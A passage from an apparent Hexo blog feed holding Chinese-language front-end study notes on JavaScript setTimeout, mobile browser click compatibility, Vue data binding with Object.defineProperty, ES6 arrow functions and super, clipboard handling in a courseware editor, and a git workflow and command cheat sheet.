<h2 id="1-setTimeout-（参考：小红书-p203，MDN）"><a href="#1-setTimeout-（参考：小红书-p203，MDN）" class="headerlink" title="1. setTimeout （参考：小红书 p203，MDN）"></a>1. setTimeout （参考：小红书 p203，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/setTimeout#Reasons_for_delays_longer_than_specified" target="_blank" rel="noopener">MDN</a>）</h2><h3 id="setTimeout-的基本概念："><a href="#setTimeout-的基本概念：" class="headerlink" title="setTimeout 的基本概念："></a>setTimeout 的基本概念：</h3><ul>
<li>setTimeout 方法是 window 对象下的。</li>
<li>JavaScript 是一个单线程序的解释器，因此一定时间内只能执行一段代码。为了控制要执行的代码，就有一个 JavaScript 任务队列。这些任务会按照将它们添加到队列的顺序执行。setTimeout()的第二个参数告诉 JavaScript 再过多长时间把当前任务添加到队列中。如果队列是空的，那么添加的代码会立即执行；如果队列不是空的，那么它就要等前面的代码执行完了以后再执行。</li>
<li><p>接收多个参数（function, delay, param1…paramN）这里的 parma 会在 delay 延迟后自动作为参数传入 function里，但在 IE9 及以下不支持这种写法。</p>
<pre><code>setTimeout(function(p1, p2) {
    console.log(p1, p2); // param1 param2
}, 1000, &quot;param1&quot;, &quot;param2&quot;);
</code></pre></li>
<li><p>setTimeout()会返回一个表示超时调用的数值ID。这个超时调用 ID 是计划执行代码的唯一标识符，可以通过它来取消超时调用（clearTimeout()）。</p>
</li>
<li><p>超时延迟</p>
<pre><code>function foo() {
  console.log(&apos;foo has been called&apos;);
}
setTimeout(foo, 0);
console.log(&apos;After setTimeout&apos;);
// After setTimeout, foo has been called
出现这个结果的原因是，尽管hsetTimeout 以0ms的延迟来调用函数，但这个任务已经被放入了队列中并且等待下一次执行；并不是立即执行；队列中的等待函数被调用之前，当前代码必须全部运行完毕，因此这里运行结果并非预想的那样。
</code></pre></li>
<li><p>最小延迟</p>
<p>最小延时 &gt;=4ms（MDN说法），但是看下面的例子却是 2ms 甚至不到 2ms ？？？</p>
<pre><code>// 转换为时间戳看一下
console.log(new Date().getTime());
setTimeout(function() {
    console.log(new Date().getTime());
}, 0);

// 1525534082199, 1525534082201

//  使用 console.time() 和 console.timeEnd() 来统计时间
function testTimeout() {
    //  启动任务计时器
    console.time(&quot;Timeout&quot;)
    //  启动浏览器定时任务 
    setTimeout(function() {
        //  统计任务消耗的时间
        console.timeEnd(&quot;Timeout&quot;)
    }, 0)
}
testTimeout(); 
// Timeout: 1.34130859375ms
</code></pre></li>
<li>最大延时值<br>浏览器包括 IE, , Chrome, Safari, Firefox 以32个bit字节存储整数。这就会导致如果一个整数大于 2147483647 (大约24.8 天)时就会溢出，导致定时器将会被立即执行</li>
</ul>
<h3 id="看下面的例子："><a href="#看下面的例子：" class="headerlink" title="看下面的例子："></a>看下面的例子：</h3><pre><code>for (var i = 0; i &lt; 10; i++) {
   setTimeout(function(){
       console.log(new Date, i);
   }, 1000) 
}
console.log(new Date, i);
</code></pre><p>打印结果：</p>
<ul>
<li>last Sat May 05 2018 21:39:42 GMT+0800 (CST) 10 //  setTimeout 由于添加到队列的时间较晚（delay），所以会等到队列中其他任务结束之后再执行。</li>
<li>last Sat May 05 2018 21:39:43 GMT+0800 (CST) 10 // 十次,注意这里不是重复打印而是分别打印共十次， for 循环里面的 setTimeout 只是在 delay 时间后将其添加到队列中，所以 setTimeout 并不会阻碍 for 循环的时间</li>
</ul>
<h4 id="下面是转成时间戳的打印："><a href="#下面是转成时间戳的打印：" class="headerlink" title="下面是转成时间戳的打印："></a>下面是转成时间戳的打印：</h4><pre><code>for (var i = 0; i &lt; 10; i++) {
   setTimeout(function(){
       console.log(new Date().getTime(), i);
   }, 1000) 
}
console.log(&quot;last&quot;, new Date().getTime(), i);
</code></pre><p>打印结果：</p>
<ul>
<li>last 1525527917027 10</li>
<li>(3)1525527918030 10</li>
<li>(3)1525527918031 10</li>
<li>(4)1525527918032 10</li>
</ul>
<p>以上结果中的重复打印次数不是固定的，在执行一次也可能是：2，2，6；</p>
]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Browser- Compatibility]]></title>
      <url>https://fuzhongfeng.github.io/2018/05/06/2019-9-2-compatibility/</url>
      <content type="html"><![CDATA[<h2 id="1-点击事件问题"><a href="#1-点击事件问题" class="headerlink" title="1. 点击事件问题"></a>1. 点击事件问题</h2><h3 id="移动端-click"><a href="#移动端-click" class="headerlink" title="移动端 click"></a>移动端 click</h3><p>由于手机端有些浏览器不存在 click 事件，可以在全局这样处理</p>
<h4 id="解决方法1-亲测有效-："><a href="#解决方法1-亲测有效-：" class="headerlink" title="解决方法1(亲测有效)："></a>解决方法1(亲测有效)：</h4><p>可以规避当click和touchstart同时存在时点击一次但触发两次问题（如 ipad），此方法可以解决大部分问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var clickEvent = &apos;click&apos; in document.documentElement ? &apos;click&apos; : &apos;touchstart&apos;;</span><br></pre></td></tr></table></figure></p>
<h3 id="事件委托问题："><a href="#事件委托问题：" class="headerlink" title="事件委托问题："></a>事件委托问题：</h3><p>此段代码在 ios12 系统下的 safari 和 webview 中显示无效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(document).on(clickEvent, &apos;.slide&apos;, function(e) &#123;</span><br><span class="line">  if (!shouldPlayNext(e)) &#123;</span><br><span class="line">    return</span><br><span class="line">  &#125;</span><br><span class="line">  Hj_Slide.playNextStep()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>原因：ios12 下利用 document 和 body 进行事件委托绑定 click 是无效的。</p>
<h4 id="解决办法2-亲测有效-："><a href="#解决办法2-亲测有效-：" class="headerlink" title="解决办法2(亲测有效)："></a>解决办法2(亲测有效)：</h4><ul>
<li>将 click 事件委托到​​​​​非 document 或 body 的​​父级元素上</li>
<li>给​目标元素加一条样式规则 cursor: pointer;</li>
<li>将目标​元素换成 <a> 或者 button 等可点击的​元素;</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Compatibility </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Compatibility </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Vue-基础(未完)]]></title>
      <url>https://fuzhongfeng.github.io/2018/05/06/2108-5-13-vue/</url>
      <content type="html"><![CDATA[<p>先写一些简单的研究，后续研究一些源码再完善</p>
<h2 id="简单实现-vue-双向数据绑定"><a href="#简单实现-vue-双向数据绑定" class="headerlink" title="简单实现 vue 双向数据绑定"></a>简单实现 vue 双向数据绑定</h2><pre><code>var keyValue = 1;
var obj = {};
Object.defineProperty(obj, &quot;key&quot;, {
    enumerable: true, // 默认为 true
    configurable: true,  // 默认为 true
    get: function(){
        return keyValue;
    },
    set: function(newValue) {
        keyValue = newValue;
        console.log(&quot;set keyValue:&quot;, keyValue)
    },
});
console.log(obj.key);
obj.key = 2;
console.log(&quot;keyValue:&quot;, keyValue);
keyValue = 3;
console.log(obj.key);
</code></pre><p>一个简单的双向绑定：改变keyValue，obj.key得到的值也会改变，重新设置obj.key，keyValue一样会随之改变<br>每个组件实例都有相应的 watcher 实例对象，它会在组件渲染的过程中把属性记录为依赖，之后当依赖项的 setter 被调用时，会通知 watcher 重新计算，从而致使它关联的组件得以更新。</p>
<h2 id="对象-属性类型-访问器属性（红包书-p141）"><a href="#对象-属性类型-访问器属性（红包书-p141）" class="headerlink" title="对象-属性类型-访问器属性（红包书/p141）"></a>对象-属性类型-访问器属性（红包书/p141）</h2><p>访问器属性不包含数据值；它们包含一对儿 getter 和 setter 函数。<br>在读取访问器属性时，会调用 getter 函数，这个函数负责返回有效的值；在写入访问器属性时，会调用<br>setter 函数并传入新值，这个函数负责决定如何处理数据，访问器属性有如下 4 个特性：</p>
<ul>
<li>[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特<br>性，或者能否把属性修改为数据属性。对于直接在对象上定义的属性，这个特性的默认值为<br>true。</li>
<li>[[Enumerable]]：表示能否通过 for-in 循环返回属性。对于直接在对象上定义的属性，这<br>个特性的默认值为 true。</li>
<li>[[Get]]：在读取属性时调用的函数。默认值为 undefined。</li>
<li>[[Set]]：在写入属性时调用的函数。默认值为 undefined。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Vue </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ES6-常用]]></title>
      <url>https://fuzhongfeng.github.io/2018/03/26/front-end-es6/</url>
      <content type="html"><![CDATA[<h2 id="ES6相关"><a href="#ES6相关" class="headerlink" title="ES6相关"></a>ES6相关</h2><ul>
<li><p>let、const与var相比</p>
<blockquote>
<p>使用未声明的变量，直接报错<br>重复声明同一个变量，直接报错<br>是块级作用域<br>必须声明 ‘use strict’ 后才能使用let声明变量</p>
</blockquote>
</li>
<li><p>数组的解构赋值，是值的拷贝，不是深拷贝</p>
</li>
<li>对象的解构赋值，是值的拷贝，不是深拷贝，let {a: { b }} = {a: { b: 1 }} 给b赋值，此时a是未定义的</li>
<li><p>箭头函数</p>
<p>  （1）函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。<br>  （2）不可以当作构造函数，也就是不可以使用new命令，否则会抛出错误。<br>  （3）不可以使用arguments对象，该对象在函数体内不存在，如果要用，可以使用rest参数代替。<br>  （4）不可以使用yield命令，因为箭头函数不能用作Generator函数。</p>
<p>  理解定义时所在的作用域。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    fn: function () &#123;console.log(this.a)&#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.fn(); // 1</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    fn: () =&gt; &#123;console.log(this.a)&#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.fn(); // undefined</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    fn: function () &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123;console.log(this.a)&#125;, 0)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.fn(); // 1</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    fn: function () &#123;console.log(this.a)&#125;</span><br><span class="line">&#125;;</span><br><span class="line">setTimeout(obj.fn, 0); // undefined</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    fn: () =&gt; &#123;console.log(this.a)&#125;</span><br><span class="line">&#125;;</span><br><span class="line">setTimeout(obj.fn, 0); // undefined</span><br></pre></td></tr></table></figure>
</li>
<li><p>super</p>
<p>  super关键字，既可以当作函数使用，也可以当作对象使用。使用super的时候，必须显式指定是作为函数、还是作为对象使用，否则会报错。由于对象总是继承其他对象的，所以可以在任意一个对象中，使用super关键字。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;&#125;</span><br><span class="line">class B extends A &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    super();</span><br><span class="line">    /*</span><br><span class="line">    Uncaught SyntaxError: &apos;super&apos; keyword unexpected here</span><br><span class="line">    无法看出super是作为函数使用，还是作为对象使用</span><br><span class="line">    */</span><br><span class="line">    console.log(super);</span><br><span class="line">    /*</span><br><span class="line">    super.valueOf()表明super是一个对象</span><br><span class="line">    */</span><br><span class="line">    console.log(super.valueOf() instanceof B); // true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">  toString() &#123;</span><br><span class="line">    return &quot;MyObject: &quot; + super.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.toString(); // MyObject: [object Object]</span><br></pre></td></tr></table></figure>
<p>  第一种情况，当作函数使用，代表父类的构造函数，super虽然代表了父类的构造函数，但是返回的是子类的实例，即super内部的this指的是子类。super()只能用在子类的构造函数中，用在其它地方就会报错。ES6要求，子类的构造函数必须执行一次super函数。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class A&#123;&#125;</span><br><span class="line">class B extends A &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        /*</span><br><span class="line">        当作函数使用，代表父类的构造函数，相当于</span><br><span class="line">        A.prototype.constructor.call(this)</span><br><span class="line">        */</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  第二种情况，super作为对象时，在普通方法中指向父类的原型对象，在静态方法中指向父类。ES6规定，通过super调用父类的方法时，super会绑定子类的this。由于绑定子类的this，所以如果通过super对某个属性赋值，这时super就是this，赋值的属性会变成子类实例的属性。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.q = 2;</span><br><span class="line">  &#125;</span><br><span class="line">  p() &#123;</span><br><span class="line">    return 2;</span><br><span class="line">  &#125;</span><br><span class="line">  print() &#123;</span><br><span class="line">    /*</span><br><span class="line">    通过B的super.print()虽然调用的是A.prototype.print()，但是A.prototype.print()会绑定子类B的this，相当于</span><br><span class="line">    super.print.call(this)</span><br><span class="line">    */</span><br><span class="line">    console.log(this.q);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.q = 3;</span><br><span class="line">    /*</span><br><span class="line">    当作对象使用，这是普通方法，super指向A.prototype，相当于</span><br><span class="line">    A.prototype.p()</span><br><span class="line">    q是父类A实例的属性，super.q就引用不到它</span><br><span class="line">    */</span><br><span class="line">    console.log(super.p()); // 2</span><br><span class="line">    console.log(super.q); // undefined</span><br><span class="line">  &#125;</span><br><span class="line">  subPrint() &#123;</span><br><span class="line">    super.print();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">let b = new B();</span><br><span class="line">b.subPrint(); // 3</span><br></pre></td></tr></table></figure>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Parent &#123;</span><br><span class="line">  static myMethod(msg) &#123;</span><br><span class="line">    console.log(&apos;static&apos;, msg);</span><br><span class="line">  &#125;</span><br><span class="line">  myMethod(msg) &#123;</span><br><span class="line">    console.log(&apos;instance&apos;, msg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Child extends Parent &#123;</span><br><span class="line">  static myMethod(msg) &#123;</span><br><span class="line">    // 静态方法，super指向父类</span><br><span class="line">    super.myMethod(msg);</span><br><span class="line">  &#125;</span><br><span class="line">  myMethod(msg) &#123;</span><br><span class="line">    // 普通方法，super指向父类的原型对象</span><br><span class="line">    super.myMethod(msg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.myMethod(1); // static 1</span><br><span class="line">var child = new Child();</span><br><span class="line">child.myMethod(2); // instance 2</span><br></pre></td></tr></table></figure>
</li>
<li><p>Promise 使用及原理</p>
</li>
<li>Promise 和 async await 的关系</li>
<li>装饰器 Decorator</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Front-end </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Front-end </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[项目]]></title>
      <url>https://fuzhongfeng.github.io/2018/02/06/slide/</url>
      <content type="html"><![CDATA[<h1 id="在线课件技术方案"><a href="#在线课件技术方案" class="headerlink" title="在线课件技术方案"></a>在线课件技术方案</h1><h2 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h2><h4 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h4><ol>
<li><p>手动触发复制操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 编辑器暂不考虑兼容性</span><br><span class="line">document.execCommand(&apos;copy&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>如需复制自定义的内容（自定义组件等）时，需要<strong>拦截系统的复制操作</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e.preventDefault()</span><br><span class="line">e.clipboardData.setData(&apos;text/plain&apos;, &apos;自定义内容&apos;)</span><br><span class="line">// jquery 需要多通过 e.originalEvent.clipboardData 获取</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="粘贴"><a href="#粘贴" class="headerlink" title="粘贴"></a>粘贴</h4><ol>
<li><p>手动触发粘贴操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.execCommand(&apos;paste&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果想粘贴成文本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 执行插入文本操作</span><br><span class="line">document.execCommand(&apos;insertText&apos;, false, &quot;自定义的文本内容&quot;)</span><br><span class="line">e.stopPropagation()</span><br><span class="line">e.preventDefault()</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果想粘贴成图片</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.execCommand(&apos;insertImage&apos;, false, &quot;图片地址&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果想粘贴成自定义内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.preventDefault()</span><br><span class="line">// 获取已复制到剪切板内的文本内容（原生写法）</span><br><span class="line">const content = e.clipboardData.getData(&apos;Text&apos;) || e.clipboardData.getData(&apos;text/plain&apos;) </span><br><span class="line">// 根据获取到的内容进行处理</span><br><span class="line">toDoSomething(content)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h2><ol>
<li>利用 dom 标签的 contenteditable 属性实现</li>
<li><p>选择文本添加样式利用 rangy</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;1234567abc89&lt;/div&gt;</span><br><span class="line">// 如鼠标选择了 abc 然后添加字体颜色，则需要重新生成一个标签将 abc 包住</span><br><span class="line">&lt;div&gt;1234567&lt;span style=&quot;color:red;&quot;&gt;abc&lt;/span&gt;89&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>其他的用原生api处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 移除光标所选的所有区域</span><br><span class="line">window.getSelection().removeAllRanges()</span><br><span class="line">// 返回一个布尔值，用于判断选区的起始点和终点是否在同一个位置。即判断鼠标是否选择了文本</span><br><span class="line">window.getSelection().isCollapsed</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 项目 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git]]></title>
      <url>https://fuzhongfeng.github.io/2018/02/06/git-base/</url>
      <content type="html"><![CDATA[<h2 id="git-flow"><a href="#git-flow" class="headerlink" title="git flow"></a>git flow</h2><h3 id="课件项目开发-git-流程"><a href="#课件项目开发-git-流程" class="headerlink" title="课件项目开发 git 流程"></a>课件项目开发 git 流程</h3><blockquote>
<p>以主分支master为例，每当开发一个新功能时，需要从master checkout一个新的分支，最好以功能进行区分：</p>
<ol>
<li>feature/xxx</li>
<li>bugfix/xxx</li>
<li>improve/xxx</li>
</ol>
</blockquote>
<blockquote>
<p>一个分支的代码很可能开发了好几天，每天都有新的提交，这个时候，自己分支的代码要合并到master，必然会有很多的commit，通常来说一个功能开发，bug修复，只需要一个commit,此时，就需要将多个commit合并为一个。为了确保当前自己的分支代码相对于master是最新的，因此需要做下变基操作（以master做基准）过程：</p>
<ol>
<li>commit当前分支的所有代码</li>
<li>切换到master分支，git pull origin master</li>
<li>切换回自己的分支 git checkout feature/JTZXKJ-xxx</li>
<li>git rebase -i master, 进入vim编辑状态（Make a list of the commits which are about to be rebased）</li>
<li>修复除第一个commit的pick头部标志外，将其余commit的头部标志pick改为s</li>
<li>退出vim,记得wq保存</li>
<li>git push origin feature/JTZXKJ-xxx</li>
<li>如果分支feature/JTZXKJ-xxx在远程仓库已经存在，则需要git push origin feature/JTZXKJ-xxx -u —force。如果远程分支不存在：git push —set-upstream origin feature/JTZXKJ-xxx</li>
<li>提交merge request</li>
<li>代码审查，代码合并，如果代码审查过程中，认为功能开发有问题，则需要重新修改分支的代码，修改完成后，重复此过程(分支强推操作，不需要关闭已有的merge reqquest)</li>
<li>1~4的操作还可以简化为git rebase -i origin master</li>
</ol>
</blockquote>
<h2 id="git-常用命令"><a href="#git-常用命令" class="headerlink" title="git 常用命令"></a>git 常用命令</h2><ul>
<li><code>git add *</code> 和 <code>git add .</code><br><code>git add .</code>会提交所有 untracked 文件、文件夹、包括以 <code>.</code>开头的文件<br><code>git add *</code>会提交所有 untracked 文件夹、文件、但不包括<code>.</code>开头的文件</li>
<li><code>git reset HEAD &lt;file&gt;</code> 撤回已经被 add 但没有被 commit 的文件</li>
<li><code>git checkout --track origin/special</code> 该命令会在本地创建一个 special 分支用于跟踪远端的 special 分支并将本地分支切换到 special 分支</li>
<li><code>git checkout [filename]</code>放弃对本地已修改但尚未 add 的文件的修改，还原其到未修改前的状态。<br>此命令和 github client 的 <code>discard changes</code>的却别: <code>discard changes</code> 可以放弃已经被 add 的文件，但<code>git checkout [filename]</code>不能，只能放弃没有被 add 的</li>
<li><code>git checkout .</code> 放弃所有本地已修改但尚未 add 的文件的修改，但不包括新增的文件</li>
<li><code>git branch -a</code> 列出本地和远程分支</li>
<li><code>git branch [name] -D</code> 删除本地分支</li>
<li><code>git commit -m&#39;&#39; —-amend</code> 合并多个 commit 为一个</li>
<li><code>git reset --soft origin/[branch]</code> 撤回所有的 commit 记录，同步到 <code>origin/[branch]</code>。<br>它本质上是撤销了上一次 git commit 命令。 当你在运行 git commit 时，Git 会创建一个新的提交，并移动 HEAD 所指向的分支来使其指向该提交。 当你将它 reset 回 HEAD~（HEAD 的父结点）时，其实就是把该分支移动回原来的位置，而不会改变索引和工作目录。 现在你可以更新索引并再次运行 <code>git commit</code> 来完成 <code>git commit -m&#39;&#39; --amend</code> 所要做的事情了</li>
<li><code>git log</code> 查看日志，退出<code>fn + Q</code></li>
<li><code>git log -p [file]</code> — 查看某个文件的内容变化详情</li>
<li><code>git log —online</code> 简洁模式显示 log 记录</li>
<li><code>git fetch</code>：当此命令从服务器上抓取本地没有的数据时，它并不会修改工作目录中的内容。 它只会获取数据然后让你自己合并。 然而，有一个命令叫作 git pull 在大多数情况下它的含义是一个 git fetch 紧接着一个 git merge 命令。git pull = git fetch + git merge</li>
<li>git 回滚 </li>
</ul>
<ol>
<li><code>git -log</code> 找到对应的<br><code>commit 1a864433ec4a9bd712d921859a8a474510e7e871</code> </li>
<li><code>git revert [commitId]</code>: 当提交过的某一 commit 不论多久，都可以使用此命令逆向恢复当时的 commit 的更改内容并生成一个新的 commit ，相当于图形化的 revert (:q 退出时会自动 commit )，也可以强制关闭重新修改代码然后手动添加 commit（推荐使用！！！） </li>
<li><code>git reset --soft [commitId]</code> 会将某个 commit 之前的所有更改内容暂存到本地，不会丢失，但是会将多个 commit 的更改混淆 </li>
<li><code>git reset —-hard [commitId]</code> 会指向某个 commit 并将之前的内容全部舍弃，本地也不会暂存（慎用！！！）</li>
</ol>
<ul>
<li><code>git pull --rebase --autostash</code> 在操作开始之前建立一个临时存储</li>
<li><p><code>git stash</code> 当前分支有更改，此时想切换分支，但不想提交正在进行的工作，可以储藏这些变更往堆栈推送一个新的储藏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 执行 git stash 命令</span><br><span class="line">Saved working directory and index state WIP on 1.0.3: 39d9e76 add: image and iframe onload</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>git stash list</code> 要查看现有的储藏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stash@&#123;0&#125;: WIP on 1.0.3: 39d9e76 add: image and iframe onload</span><br><span class="line">stash@&#123;1&#125;: autostash</span><br><span class="line">stash@&#123;2&#125;: autostash</span><br><span class="line">stash@&#123;3&#125;: autostash</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>git stash apply [stash@{0}]</code> 重新应用之前的储藏，默认为第一个,储藏的内容仍然在栈上</p>
</li>
<li><code>git stash drop [stash@{0}]</code> 移除栈上的存储，默认为第一个</li>
<li><code>git remote -v</code>查看远程仓库</li>
<li><code>git remote add [shortname] [url]</code> 添加一个远程仓库地址(url)和缩写(shortname)git</li>
<li><code>git remote rename origin icode</code> 修改某个远程仓库在本地的简称，此命令指将 origin 远程名改为 code</li>
<li><code>git remote rm</code> 删除本地的远程链接</li>
<li><code>git push gitlab 1.0.3</code> 将本地推到 gitlab 远端的 1.0.3 分支</li>
<li><code>git pull gitlab 1.0.3</code> 拉取远端的 1.0.3 分支</li>
</ul>
<h3 id="恢复删除远端不存在的本地分支"><a href="#恢复删除远端不存在的本地分支" class="headerlink" title="恢复删除远端不存在的本地分支"></a>恢复删除远端不存在的本地分支</h3><blockquote>
<p>方法一：</p>
<ol>
<li><code>git log -g</code> 可显示出被误删分支的 commitId，此命令会显示出切换分支的记录以及commit记录等。</li>
<li><code>git branch [branchName] [commitId]</code> // 基于被误删分支最新的 commitId 新建分支，此时新建的分支上会包含最新 commitId 之前的所有 commit。<br>方法二：</li>
<li><code>git reflog</code> 可显示被删除分支的commitId</li>
<li><code>git branch [branchName] [commitId]</code>  新建分支<br>此方法要优于 <code>git log -g</code> 因为如果删除的分支最后一次提交时间太久很难找到</li>
</ol>
</blockquote>
